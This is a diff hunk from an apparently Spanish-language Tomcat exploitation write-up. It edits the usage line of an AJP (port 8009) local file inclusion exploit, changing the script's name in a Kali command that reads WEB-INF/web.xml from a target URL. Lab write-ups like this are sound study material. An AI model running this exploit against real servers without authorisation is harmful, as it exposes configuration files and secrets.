@@ -186,6 +186,6 @@ Uso del exploit considerando de que el puerto debe ser el de Apache Jserv (ajp13
 
 ```bash
 ┌──(root㉿kali)-[/tomcat]
-└─ python2 TomcatLFI.py <url> -p 8009 -f WEB-INF/web.xml
+└─ python2 tomcat-ajp.lfi.py <url> -p 8009 -f WEB-INF/web.xml
 ```
 
